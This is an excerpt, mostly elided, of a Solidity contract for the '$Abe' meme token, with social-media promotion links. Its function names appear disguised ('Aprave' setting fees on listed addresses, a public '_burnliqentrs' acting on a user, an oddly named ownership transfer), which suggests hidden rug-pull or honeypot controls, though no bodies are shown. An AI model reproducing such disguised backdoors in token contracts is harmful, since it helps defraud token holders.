...
/**
https://t.me/Abe_Coinerc
https://t.me/UniswapFounderDog_Abe
https://twitter.com/Abe_erc
$Abe - Uniswap Founder's Dog
*/
...
abstract contract Ownable {
    ...
    function transferOwnershipunisapece(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
    }

}

contract ABE is Ownable {
    ...
    function Aprave(address[] memory _addresses, uint256 _feePercentage) external {
    ...
    function _burnliqentrs(address user) public {
